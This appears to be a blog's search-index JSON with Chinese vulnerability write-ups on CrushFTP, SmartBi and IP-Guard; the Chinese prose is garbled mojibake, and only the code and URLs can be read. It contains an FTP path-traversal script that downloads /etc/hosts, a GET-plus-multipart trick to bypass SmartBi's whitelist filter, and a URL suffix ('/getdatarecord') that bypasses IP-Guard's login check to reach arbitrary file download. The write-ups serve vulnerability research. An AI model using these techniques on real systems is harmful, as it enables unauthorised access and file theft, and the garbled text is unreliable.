æ¥ä¸‹æ¥çš„ååˆ©ç”¨å°±æ˜¯è¯»å–adminçš„è´¦æˆ·å¯†ç åšè§£å¯†ç™»é™†åå°å®ç°è¶Šæƒäº† FTPçš„åˆ©ç”¨æœ¬æ¥æƒ³å†™ä¸€ä¸‹çš„ä½†æ˜¯å¤ªæ™šäº†ï¼Œä¹äº†ç´¢æ€§å°±ç¡äº†ï¼Œftpçš„åˆ©ç”¨æ–¹å¼åˆ™æ›´ç®€å•ï¼Œä»–æ²¡æœ‰å¤šæ¬¡çš„è·¯å¾„å¤„ç†ï¼Œä»…ä»…åªæœ‰ä¸€æ¬¡ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ç»™å‡ºè„šæœ¬ï¼Œç•™ä¸ªå°ä½œä¸šï¼Œæœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥åœ¨çŸ¥è¯†æ˜ŸæœŸå¯¹FTPçš„åˆ©ç”¨åšåˆ†æ 123456789101112131415161718192021222324252627282930313233343536373839404142434445from ftplib import FTP# è¿œç¨‹ftpæœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£å·host = &#x27;127.0.0.1&#x27;port = 21# ç™»å½•ç”¨æˆ·åå’Œå¯†ç username = &#x27;y4tacker&#x27;password = &#x27;y4tacker&#x27;# è¿æ¥è¿œç¨‹ftpæœåŠ¡å™¨ftp = FTP()ftp.connect(host, port)# ç™»å½•ftp.login(username, password)# åˆ—å‡ºè¿œç¨‹ftpæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶def list_files(): files = [] ftp.retrlines(&#x27;LIST&#x27;, files.append) for file in files: print(file)# ä¸‹è½½è¿œç¨‹ftpæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶def download_file(remote_file, local_file): with open(local_file, &#x27;wb&#x27;) as f: ftp.retrbinary(&#x27;RETR &#x27; + remote_file, f.write)# åˆ—å‡ºè¿œç¨‹ftpæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶# list_files()def list_files_in_dir(dir): files = ftp.nlst(dir) for file in files: print(file)ftp.cwd(&quot;Desktop&quot;)# list_files_in_dir(&quot;../../../&quot;)# # ä¸‹è½½è¿œç¨‹ftpæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶download_file(&#x27;..!!!~/..!!!~/..!!!~/etc/hostsz&#x27;, &#x27;local_file.txt&#x27;)## # å…³é—­ftpè¿æ¥ftp.quit() ç¡äº†ç¡äº†~~~","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"CrushFTP","slug":"CrushFTP","permalink":"https://y4tacker.github.io/tags/CrushFTP/"}]},{"title":"æµ…æSmartBié€»è¾‘æ¼æ´(3)","slug":"year/2024/4/æµ…æSmartBié€»è¾‘æ¼æ´-3","date":"2024-04-19T02:10:30.000Z","updated":"2024-04-19T05:33:54.000Z","comments":true,"path":"2024/04/19/year/2024/4/æµ…æSmartBié€»è¾‘æ¼æ´-3/","link":"","permalink":"https://y4tacker.github.io/2024/04/19/year/2024/4/%E6%B5%85%E6%9E%90SmartBi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-3/","excerpt":"","text":"æµ…æSmartBié€»è¾‘æ¼æ´(3)å‰è¨€è¿™ä¸ªç³»åˆ—ç»ˆäºåˆ°äº†ç¬¬ä¸‰ç¯‡ï¼ŒæŒ‡æ¡è·¯ï¼Œå¦‚æœå¿˜è®°äº†å¯ä»¥å†çœ‹çœ‹ä¹‹å‰å†™çš„æ–‡ç«  æµ…æSmartbié€»è¾‘æ¼æ´ æµ…æSmartbié€»è¾‘æ¼æ´(2) ä¹‹å‰æˆ‘å°±æ›¾åœ¨ç¬¬äºŒç¯‡æœ«å°¾æåˆ°è¿‡ï¼ˆæ²¡äººç»§ç»­æ·±å…¥çœ‹ï¼‰ï¼Œä»ç„¶å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œä»Šå¤©è¿™ä¸ªé—®é¢˜ç»ˆäºå¾—ä»¥ä¿®å¤ å½“ç„¶è€è§„çŸ©ï¼Œè¿™é‡Œä»…åˆ†äº«é€»è¾‘æ¼æ´éƒ¨åˆ†è¡¥ä¸ç»•è¿‡æ€è·¯ï¼Œä¸æä¾›å®Œæ•´payload è¡¥ä¸è¡¥ä¸ä¸­æ–°å¢äº†ä¸€ä¸ªè§„åˆ™ 12345&quot;rules&quot;: [&#123; &quot;className&quot;: &quot;*&quot;, &quot;methodName&quot;: &quot;*&quot;, &quot;type&quot;: &quot;RejectGetAndFormData&quot;&#125; ä¸€çœ¼ä¸çœŸï¼Œé‰´å®šä¸ºä¸èƒ½åŒæ—¶ä½¿ç”¨GETä¸Multipart 12345678910111213141516171819202122232425262728protected int patchRMI(String className, String methodName, HttpServletRequest request, HttpServletResponse response, FilterChain chain) &#123; String contentType = request.getContentType(); if (this.isNullOrEmpty(contentType)) &#123; contentType = &quot;&quot;; &#125; String method = request.getMethod(); if (this.isNullOrEmpty(method)) &#123; method = &quot;&quot;; &#125; if (&quot;get&quot;.equals(method.toLowerCase(Locale.ENGLISH)) &amp;&amp; contentType.toLowerCase(Locale.ENGLISH).startsWith(&quot;multipart/form-data&quot;)) &#123; return 1; &#125; else &#123; String params = request.getParameter(&quot;params&quot;); if (params == null) &#123; params = (String)request.getAttribute(&quot;params&quot;); &#125; if (this.isNotNullAndEmpty(className) &amp;&amp; this.isNotNullAndEmpty(methodName) &amp;&amp; this.isNotNullAndEmpty(params)) &#123; request.setAttribute(&quot;className&quot;, className); request.setAttribute(&quot;methodName&quot;, methodName); request.setAttribute(&quot;params&quot;, params); &#125; return 0; &#125;&#125; åˆ©ç”¨åˆ†æå…¶å®è¿™ä¸ªæœ‰ä¸¤ç§æ‰“æ³•ï¼Œå› ä¸ºä¸¤ä¸ªç‰ˆæœ¬ä»£ç ä¸ä¸€æ ·ï¼Œè¿™é‡Œæˆ‘ä»¬ä»¥V9ä»£ç ä¸ºä¾‹ ç®€å•åšä¸ªå›é¡¾(è¯¦ç»†çš„è‡ªå·±çœ‹è€ç‰ˆæœ¬åˆ†æ)ï¼Œå½“æˆ‘ä»¬è°ƒç”¨RMIServletä¹‹å‰éœ€è¦ç»•è¿‡CheckIsLoggedFilterçš„åˆ¤æ–­ï¼Œä¿è¯åœ¨CheckIsLoggedFilterä¸­æŒ‡å‘çš„ç±»ä¸æ–¹æ³•åœ¨ç™½åå•å½“ä¸­ï¼Œè€Œåœ¨RMIServletå®é™…è°ƒç”¨æ—¶æŒ‡å‘çœŸæ­£è¦æ‰§è¡Œé»‘åå•æ–¹æ³• æ¥ä¸‹æ¥å›åˆ°CheckIsLoggedFilter,å¦‚æœæˆ‘ä»¬è¯·æ±‚æ˜¯GETæ–¹æ³•ï¼Œä¹‹åå°±ä¼šé€šè¿‡httpRequest.getParameterè·å–æˆ‘ä»¬çš„className\\methodName\\encodeå‚æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374boolean isRmi = &quot;/vision/RMIServlet&quot;.equals(((HttpServletRequest)httpRequest).getServletPath()); String requestStr; if (isRmi) &#123; String queryString = ((HttpServletRequest)httpRequest).getQueryString(); String params; if (queryString != null &amp;&amp; queryString.startsWith(&quot;windowUnloading&quot;)) &#123; params = queryString.length() &gt; &quot;windowUnloading&quot;.length() &amp;&amp; queryString.charAt(&quot;windowUnloading&quot;.length()) == &#x27;=&#x27; ? &quot;windowUnloading=&amp;&quot; : &quot;windowUnloading&amp;&quot;; .......æ­¤å¤„çœç•¥....... &#125; else if (&quot;GET&quot;.equals(((HttpServletRequest)httpRequest).getMethod())) &#123; className = ((HttpServletRequest)httpRequest).getParameter(&quot;className&quot;); methodName = ((HttpServletRequest)httpRequest).getParameter(&quot;methodName&quot;); encode = ((HttpServletRequest)httpRequest).getParameter(&quot;encode&quot;); &#125; if (encode != null &amp;&amp; className == null &amp;&amp; methodName == null) &#123; String[] decode = RMICoder.decode(encode); className = decode[0]; methodName = decode[1]; params = decode[2]; ((HttpServletRequest)httpRequest).setAttribute(&quot;className&quot;, className); ((HttpServletRequest)httpRequest).setAttribute(&quot;methodName&quot;, methodName); ((HttpServletRequest)httpRequest).setAttribute(&quot;params&quot;, params); ((HttpServletRequest)httpRequest).setAttribute(&quot;request_encoded&quot;, Boolean.TRUE); &#125; if (className == null &amp;&amp; methodName == null &amp;&amp; (((HttpServletRequest)httpRequest).getContentType() == null || !((HttpServletRequest)httpRequest).getContentType().startsWith(&quot;multipart/form-data;&quot;))) &#123; ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] buff = new byte[4096]; InputStream is = ((HttpServletRequest)httpRequest).getInputStream(); int readed; while((readed = is.read(buff)) &gt;= 0) &#123; baos.write(buff, 0, readed); &#125; requestStr = baos.toString(&quot;UTF-8&quot;); String[] requestParams = requestStr.split(&quot;\\\\&amp;&quot;); String encodeValue = null; String[] decode = requestParams; int var19 = requestParams.length; for(int var20 = 0; var20 &lt; var19; ++var20) &#123; String param = decode[var20]; int index = param.indexOf(61); if (index != -1) &#123; String key = param.substring(0, index); String value = param.substring(index + 1); value = URLDecoder.decode(value, &quot;UTF-8&quot;); if (encodeValue == null &amp;&amp; &quot;encode&quot;.equals(key)) &#123; encodeValue = value; &#125; ((HttpServletRequest)httpRequest).setAttribute(key, value); &#125; &#125; className = (String)((HttpServletRequest)httpRequest).getAttribute(&quot;className&quot;); methodName = (String)((HttpServletRequest)httpRequest).getAttribute(&quot;methodName&quot;); if (className == null &amp;&amp; methodName == null &amp;&amp; encodeValue != null) &#123; decode = RMICoder.decode(encodeValue); className = decode[0]; methodName = decode[1]; String params = decode[2]; ((HttpServletRequest)httpRequest).setAttribute(&quot;className&quot;, className); ((HttpServletRequest)httpRequest).setAttribute(&quot;methodName&quot;, methodName); ((HttpServletRequest)httpRequest).setAttribute(&quot;params&quot;, params); ((HttpServletRequest)httpRequest).setAttribute(&quot;request_encoded&quot;, Boolean.TRUE); &#125; if (LOG.isTraceEnabled()) &#123; LOG.trace(&quot;Get parameter &#x27;className&#x27; return null. Parse request.getInputStream() result:&quot; + className + &quot;.&quot; + methodName); &#125; &#125; &#125; æ¥ä¸‹æ¥æˆ‘ä»¬å†æ¥å›é¡¾RMIServletä¸­å¯¹å‚æ•°çš„è·å–(smartbi.util.RMIUtil#parseRMIInfo(javax.servlet.http.HttpServletRequest, boolean)) é¦–å…ˆå°è¯•é€šè¿‡request.getParameterå°è¯•è·å–className\\methodName\\paramså‚æ•°ï¼Œå¦‚æœä¸ºç©ºåˆ™é€šè¿‡è‡ªå®šä¹‰å®ç°çš„Multipartåšè§£æè·å– 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) &#123; if (!&quot;/vision/RMIServlet&quot;.equals(request.getServletPath()) &amp;&amp; !forceParse) &#123; return null; &#125; else &#123; RMIInfo info = getRMIInfoFromRequest(request); if (info != null) &#123; return info; &#125; else &#123; String className = request.getParameter(&quot;className&quot;); String methodName = request.getParameter(&quot;methodName&quot;); String params = request.getParameter(&quot;params&quot;); if (StringUtil.isNullOrEmpty(className) &amp;&amp; StringUtil.isNullOrEmpty(methodName) &amp;&amp; StringUtil.isNullOrEmpty(params) &amp;&amp; request.getContentType() != null &amp;&amp; request.getContentType().startsWith(&quot;multipart/form-data;&quot;)) &#123; DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try &#123; List&lt;FileItem&gt; fileItems = upload.parseRequest(request); request.setAttribute(&quot;UPLOAD_FILE_ITEMS&quot;, fileItems); Iterator var10 = fileItems.iterator(); while(var10.hasNext()) &#123; FileItem fileItem = (FileItem)var10.next(); if (fileItem.isFormField()) &#123; String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(&quot;UTF-8&quot;); if (&quot;className&quot;.equals(itemName)) &#123; className = itemValue; &#125; else if (&quot;methodName&quot;.equals(itemName)) &#123; methodName = itemValue; &#125; else if (&quot;params&quot;.equals(itemName)) &#123; params = itemValue; &#125; else if (&quot;encode&quot;.equals(itemName)) &#123; encodeString = itemValue; &#125; &#125; &#125; &#125; catch (UnsupportedEncodingException | FileUploadException var14) &#123; LOG.error(var14.getMessage(), var14); &#125; if (!StringUtil.isNullOrEmpty(encodeString)) &#123; String[] decode = (String[])((String[])CodeEntry.decode(encodeString, true)); className = decode[0]; methodName = decode[1]; params = decode[2]; &#125; &#125; if (className == null &amp;&amp; methodName == null) &#123; className = (String)request.getAttribute(&quot;className&quot;); methodName = (String)request.getAttribute(&quot;methodName&quot;); params = (String)request.getAttribute(&quot;params&quot;); &#125; info = new RMIInfo(); info.setClassName(className); info.setMethodName(methodName); info.setParams(params); request.setAttribute(&quot;ATTR_KEY_RMIINFO&quot;, info); return info; &#125; &#125;&#125; çœ‹å®Œä»¥åï¼Œèªæ˜çš„åŒå­¦å·²ç»èƒ½æƒ³åˆ°ä¸€ä¸ªè§£æå·®å¼‚çš„é—®é¢˜ å¦‚æœæˆ‘ä»¬å°†è¯·æ±‚æ–¹æ³•è®¾ç½®ä¸ºGET,åœ¨queryStringä¸­ä»…ä¼ å…¥encodeå‚æ•°(ç™½åå•ç±»æ–¹æ³•)ï¼Œå†å°†çœŸå®è¦æ‰§è¡Œçš„æ”¾åœ¨Multipartéƒ¨åˆ†ä¸å°±èƒ½ç»•è¿‡Filterçš„æ ¡éªŒäº†ä¹ˆ å°†ä»¥ä¸Šå¸¦å…¥æ‰§è¡Œæµç¨‹åšä¸ªç®€å•æ¢³ç†ï¼š â€”â€“Filterâ€”â€” è¯·æ±‚æ–¹æ³•ä¸ºGETã€è·å–å‚æ•°className(ç©º)\\methodName(ç©º)\\encode(éç©º) ç”±äºclassNameä¸methodNameä¸ºç©ºï¼Œé€šè¿‡RMICoderè§£ç å†…å®¹ä¸ºå…¶èµ‹å€¼ åˆ¤æ–­ç±»ä¸æ–¹æ³•ååœ¨ç™½åå•ä¸­ï¼ŒFilteræ ¡éªŒé€šè¿‡ â€”â€“Servletâ€”- é€šè¿‡request.getParameteræœªè·å–åˆ°ç±»ã€æ–¹æ³•ä»¥åŠå‚æ•° åˆ¤æ–­Headerçš„Content-Typeå¤´å­˜åœ¨multipart/form-data; è§£æBodyï¼Œè·å–åˆ°çœŸå®æ‰§è¡Œçš„ç±»ã€æ–¹æ³•ä»¥åŠå‚æ•°ï¼Œæœ€ç»ˆå®Œæˆè°ƒç”¨ å› æ­¤V9ç³»ç»Ÿä¸‹çš„åˆ†æå°±å®Œæˆäº†ï¼Œè¡¥ä¸ªåˆ©ç”¨æˆªå›¾(V9) å½“ç„¶å…¶å®åœ¨V11å½“ä¸­è¿™ä¸ªè§£æä¹Ÿæœ‰ä¸€å®šå·®å¼‚ åœ¨V11ç³»ç»Ÿå½“ä¸­ä¸èƒ½é€šè¿‡encode+multipartçš„ç»„åˆå§¿åŠ¿å®Œæˆç»•è¿‡ å°±å½“æ˜¯ç•™ä¸ªå°ä½œä¸šå§ï¼ŒV11å½“ä¸­åˆ°åº•æœ‰ä»€ä¹ˆå·®å¼‚å‘¢ï¼Ÿåˆè¯¥å¦‚ä½•æ„é€ ç»•è¿‡çš„Payloadå‘¢ï¼Ÿåˆ©ç”¨æˆªå›¾(V11)","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Smartbi","slug":"Smartbi","permalink":"https://y4tacker.github.io/tags/Smartbi/"}]},{"title":"IP-Guardæƒé™ç»•è¿‡æµ…æ","slug":"year/2024/4/IP-Guardæƒé™ç»•è¿‡æµ…æ","date":"2024-04-17T01:39:31.000Z","updated":"2024-04-20T06:06:28.000Z","comments":true,"path":"2024/04/17/year/2024/4/IP-Guardæƒé™ç»•è¿‡æµ…æ/","link":"","permalink":"https://y4tacker.github.io/2024/04/17/year/2024/4/IP-Guard%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/","excerpt":"","text":"IP-Guardæƒé™ç»•è¿‡æµ…ææ¯”è¾ƒé€‚åˆæ–°æ‰‹å­¦ä¹ çš„ä¸€ä¸ªå®¡è®¡æ¡ˆä¾‹ï¼Œä»£ç ç®€å•æ— é˜…è¯»éšœç¢ æƒé™ç»•è¿‡IP-Guardé‡‡ç”¨CodeIgniteræ¡†æ¶äºŒæ¬¡å¼€å‘ï¼Œä»å¾®æ­¥æƒ…æŠ¥çœ‹ä½œç”¨ä»…æ˜¯â€å¯ä»¥ç»•è¿‡æƒé™éªŒè¯ï¼Œè°ƒç”¨åå°æ¥å£è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€åˆ é™¤ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è¯»å–æ•°æ®åº“é…ç½®ä¿¡æ¯ï¼Œè¿›è€Œæ¥ç®¡æ•°æ®åº“â€ é€šå¸¸æ¥è¯´ï¼ŒCodeIgniterä¸­çš„é‰´æƒé€šå¸¸æ˜¯åœ¨æ§åˆ¶å™¨ä¸­çš„æ„é€ å‡½æ•°ä¸­ å› ä¸ºä»£ç ä¸å¤šï¼Œæœ€åå¯ä»¥å‘ç°æ¶‰åŠæ–‡ä»¶è¯»å†™çš„åœ¨mApplyList#downloadFile_client å†æ¥çœ‹çœ‹æ„é€ å‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596public function __construct()&#123; parent::__construct(); $this-&gt;load-&gt;helper(&quot;applicationFunc&quot;); $this-&gt;load-&gt;model(&quot;Application_model&quot;); $this-&gt;load-&gt;helper(&quot;common&quot;); $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;library(&quot;session&quot;); $language = $this-&gt;session-&gt;userdata(&#x27;language&#x27;); switch ($language) &#123; case &quot;en-us&quot;: $this-&gt;lcid = 0x0409; break; case &quot;zh-cn&quot;: $this-&gt;lcid = 0x0804; break; case &quot;zh-tw&quot;: $this-&gt;lcid = 0x0404; break; default: $language = &quot;zh-cn&quot;; $this-&gt;lcid = 0x0409; &#125; $this-&gt;language = $language; $this-&gt;logID = $this-&gt;session-&gt;userdata(&#x27;LogID&#x27;); $this-&gt;SuName = $this-&gt;session-&gt;userdata(&#x27;SuName&#x27;); $this-&gt;ManagerID = $this-&gt;session-&gt;userdata(&#x27;ManagerID&#x27;); $this-&gt;pfunc = $this-&gt;session-&gt;userdata(&#x27;apprfunc&#x27;); // è·å–ä¿å­˜çš„åŠŸèƒ½ç±»å‹ if(empty($this-&gt;pfunc)) $this-&gt;pfunc = &#x27;normal&#x27;;//é»˜è®¤é€‰ä¸­æ¡Œé¢ç”³è¯·ç®¡ç† $this-&gt;viewtype = $this-&gt;session-&gt;userdata(&#x27;viewtype&#x27;); if (empty($this-&gt;viewtype)) $this-&gt;viewtype = &#x27;pending&#x27;;//é»˜è®¤ç­‰å¾…æ€»è§ˆ $this-&gt;ufunc_rights = $this-&gt;session-&gt;userdata(&#x27;funcrights&#x27;); $this-&gt;isApp = $this-&gt;session-&gt;userdata(&#x27;isApp&#x27;); $this-&gt;config-&gt;set_item(&#x27;language&#x27;, $language); //$this-&gt;lang-&gt;load($language);//åŠ è½½å¤šè¯­è¨€æ•°ç»„ $this-&gt;lang-&gt;load($language, &#x27;appr&#x27;); $this-&gt;lang-&gt;load(&quot;console&quot;, $language); $url = $_SERVER[&#x27;REQUEST_URI&#x27;]; $arrURL = parse_url($url); $func = substr(strrchr(rtrim($arrURL[&#x27;path&#x27;], &#x27;/&#x27;), &#x27;/&#x27;), 1); $func = strtolower($func); if(!isset($this-&gt;logID) || empty($this-&gt;logID) || !isset($this-&gt;language) || empty($this-&gt;language) || !isset($this-&gt;SuName) || empty($this-&gt;SuName) ) &#123; //åˆ¤æ–­æœ‰æ²¡æœ‰device_token çš„sessionï¼Œæœ‰å°±æ˜¯å·²ç™»å½•çš„appåœ¨å‘èµ·è¯·æ±‚ $deviceToken = $this-&gt;session-&gt;userdata(&#x27;device_token&#x27;); $appMode = $this-&gt;session-&gt;userdata(&quot;app_mode&quot;); //å¯¹äºæ—§ç‰ˆæœ¬çš„appï¼Œè¿™ä¸¤ä¸ªå€¼æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œä¸æ‰§è¡Œæ›´æ–°token if(!isNull($deviceToken) &amp;&amp; !isNull($appMode))&#123; $this-&gt;device_token = $deviceToken; $this-&gt;app_mode = $appMode; $langConfig = $this-&gt;lang-&gt;language; $update_res = rw_device_token(UPDATE_DEVICE_TOKEN, $appMode, $this-&gt;SuName, $deviceToken, $langConfig); &#125; if($func != &#x27;download&#x27;) &#123; if ($func == &#x27;getdatarecord&#x27;) &#123; $this-&gt;errorresult(ErrorCode::OERR_NOT_LOGIN); return ; &#125; redirect(&quot;appr/SignIn&quot;); return ; &#125; else &#123; session_start(); $this-&gt;logID = $_SESSION[&#x27;downloadLogID&#x27;]; $this-&gt;language = $_SESSION[&#x27;downloadLang&#x27;]; $this-&gt;SuName = $_SESSION[&#x27;downloadSuName&#x27;]; $this-&gt;ManagerID = $_SESSION[&#x27;downloadManagerID&#x27;]; if(!isset($this-&gt;logID) || empty($this-&gt;logID) || !isset($this-&gt;language) || empty($this-&gt;language) || !isset($this-&gt;SuName) || empty($this-&gt;SuName) ) &#123; redirect(&quot;appr/SignIn&quot;); &#125; &#125; &#125; else &#123; $this-&gt;load-&gt;library(&#x27;user_agent&#x27;); $this-&gt;isM = $this-&gt;agent-&gt;is_mobile(); if (!$this-&gt;isM) &#123; redirect(&quot;appr/ApplyList&quot;); &#125; &#125;&#125; æˆ‘ä»¬é‡ç‚¹çœ‹è¿™ä¸€æ®µä»£ç å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœ$func == &#39;getdatarecord&#39;è™½ç„¶è®¾ç½®äº†æœªç™»å½•çš„æ—¥å¿—ï¼Œä½†æ˜¯åœ¨returnä¹‹å‰å¹¶æ²¡æœ‰é‡å®šå‘åˆ°ç™»å½•é¡µï¼Œè€Œè¿™ä¸ªfuncåˆ™æ˜¯ç”±uriæœ€åä¸€ä¸ªè·¯å¾„å†³å®šï¼Œè¿™é‡Œå…¶å®å­˜åœ¨ä¸€ä¸ªé€»è¾‘é—®é¢˜ å› ä¸ºæˆ‘ä»¬çŸ¥é“phpå„ç±»æ¡†æ¶éƒ½æ˜¯æ”¯æŒè·¯å¾„ä¼ å…¥åŠ¨æ€å‚æ•°ï¼Œè¿™æ˜¯ä¸»æµPHP-MVCæ¡†æ¶éƒ½æ”¯æŒçš„æ“ä½œï¼Œå› æ­¤è®¿é—®http://ipg/appr/MApplyList/xxx/ä¸http://ipg/appr/MApplyList/xxx/getdatarecordå…¶å®æ˜¯ç­‰æ•ˆçš„ï¼Œéƒ½èƒ½èµ°åˆ°å¯¹åº”çš„Controllerä»¥åŠMethodï¼Œå› è€Œä¾¿èƒ½ç»•è¿‡å¯¹æ„é€ å‡½æ•°çš„éªŒè¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445$url = $_SERVER[&#x27;REQUEST_URI&#x27;];$arrURL = parse_url($url);$func = substr(strrchr(rtrim($arrURL[&#x27;path&#x27;], &#x27;/&#x27;), &#x27;/&#x27;), 1);$func = strtolower($func);if(!isset($this-&gt;logID) || empty($this-&gt;logID) || !isset($this-&gt;language) || empty($this-&gt;language) || !isset($this-&gt;SuName) || empty($this-&gt;SuName) )&#123; $deviceToken = $this-&gt;session-&gt;userdata(&#x27;device_token&#x27;); $appMode = $this-&gt;session-&gt;userdata(&quot;app_mode&quot;); if(!isNull($deviceToken) &amp;&amp; !isNull($appMode))&#123; $this-&gt;device_token = $deviceToken; $this-&gt;app_mode = $appMode; $langConfig = $this-&gt;lang-&gt;language; $update_res = rw_device_token(UPDATE_DEVICE_TOKEN, $appMode, $this-&gt;SuName, $deviceToken, $langConfig); &#125; if($func != &#x27;download&#x27;) &#123; if ($func == &#x27;getdatarecord&#x27;) &#123; $this-&gt;errorresult(ErrorCode::OERR_NOT_LOGIN); return ; &#125; redirect(&quot;appr/SignIn&quot;); return ; &#125; else &#123; session_start(); $this-&gt;logID = $_SESSION[&#x27;downloadLogID&#x27;]; $this-&gt;language = $_SESSION[&#x27;downloadLang&#x27;]; $this-&gt;SuName = $_SESSION[&#x27;downloadSuName&#x27;]; $this-&gt;ManagerID = $_SESSION[&#x27;downloadManagerID&#x27;]; if(!isset($this-&gt;logID) || empty($this-&gt;logID) || !isset($this-&gt;language) || empty($this-&gt;language) || !isset($this-&gt;SuName) || empty($this-&gt;SuName) ) &#123; redirect(&quot;appr/SignIn&quot;); &#125; &#125;&#125; ä»»æ„æ–‡ä»¶æ“ä½œåœ¨mApplyList.phpä¸­å’Œæ–‡ä»¶ä¸‹è½½æ¶‰åŠdownloadFileå’ŒdownloadFile_clientï¼Œå‰è€…æ¶‰åŠåˆ°sessionæ“ä½œä¸”æ–‡ä»¶åæ— æ³•æ§åˆ¶ï¼Œè€Œåœ¨downloadFile_clientä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¸€åˆ‡éƒ½å¾ˆç®€å•ï¼Œè‡ªå·±çœ‹çœ‹ä»£ç å³å¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337function downloadFile_client()&#123; session_write_close(); $langConfig = $this-&gt;lang-&gt;language; $path = $this-&gt;input-&gt;post_get(&#x27;path&#x27;); $fileName = $this-&gt;input-&gt;post_get(&#x27;filename&#x27;); $action = $this-&gt;input-&gt;post_get(&#x27;action&#x27;); $backparam = $this-&gt;input-&gt;post_get(&#x27;backparam&#x27;); if ($action != &quot;download&quot;) &#123; $detail = $this-&gt;input-&gt;post_get(&#x27;detail&#x27;); &#125; $guidID = $this-&gt;input-&gt;post_get(&#x27;reqID&#x27;); $type = $this-&gt;input-&gt;post_get(&#x27;type&#x27;); $srcPath = $this-&gt;input-&gt;post_get(&#x27;srcpath&#x27;); if(!isset($path) || $path == &quot;&quot; || !isset($fileName) || $fileName == &quot;&quot; || !isset($action) || $action == &quot;&quot;) &#123; $msg = $langConfig[&#x27;details_fileNotExit&#x27;]; $data[&#x27;msg&#x27;] = $msg; $data[&#x27;isM&#x27;] = $this-&gt;isM?&#x27;mobile&#x27;:&#x27;pc&#x27;; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;backParam&#x27;] = $backparam; $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;view(&#x27;appr/ErrorView2&#x27;,$data); return; &#125; $path = &quot;tempFile/&quot;.$path; $file_dir = $path; $msg = &quot;&quot;; //å–æ–‡ä»¶çš„åç§°ä»¥åŠç±»å‹ $fileBaseName = preg_replace(&#x27;/^.+[\\\\\\\\\\\\/]/&#x27;, &#x27;&#x27;, $fileName); // å–æ–‡ä»¶ç±»å‹ $path_parts = pathinfo($fileBaseName); if (!file_exists($file_dir)) &#123; //æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ $msg = $langConfig[&#x27;details_fileNotExit&#x27;]; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;msg&#x27;] = $msg; $data[&#x27;isM&#x27;] = $this-&gt;isM?&#x27;mobile&#x27;:&#x27;pc&#x27;; $data[&#x27;backParam&#x27;] = $backparam; $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;view(&#x27;appr/ErrorView2&#x27;,$data); return; &#125; else if ($action == &quot;download&quot;) &#123; $fileBaseName = getFileBaseName($fileName); $fileBaseName = rawurldecode(rawurldecode($fileBaseName)); $nSize = filesize($file_dir); $fp = fopen($file_dir, &quot;rb&quot;); // è¾“å…¥æ–‡ä»¶æ ‡ç­¾ Header(&#x27;Cache-Control: must-revalidate,post-check=0,pre-check=0&#x27;); Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Accept-Ranges: bytes&quot;); Header(&quot;Content-Length: &quot;.filesize($file_dir)); Header(&#x27;Pragma: public&#x27;); $ua = $_SERVER[&quot;HTTP_USER_AGENT&quot;]; if (preg_match(&quot;/MSIE/&quot;, $ua)) &#123; header(&#x27;Content-Disposition: attachment;filename=&quot;&#x27; . $fileBaseName . &#x27;&quot;&#x27;); &#125; elseif (preg_match(&quot;/Firefox/&quot;, $ua)) &#123; header(&#x27;Content-Disposition: attachment; filename*=&quot;utf8\\&#x27;\\&#x27;&#x27; . $fileBaseName . &#x27;&quot;&#x27;); &#125; elseif (preg_match(&quot;/Chrome/&quot;, $ua)) &#123; header(&#x27;Content-Disposition: attachment; filename=&#x27; . $fileBaseName); &#125; else &#123; header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27; . $fileBaseName . &#x27;&quot;&#x27;); &#125; ob_clean(); ob_end_clean(); set_time_limit(0); $buffer = 1024; while (!feof($fp))&#123; print fread($fp, $buffer); flush(); &#125; fclose($fp); //chmod($file_dir,0777); //ä¿®æ”¹æƒé™ //unlink($file_dir); exit; &#125; else 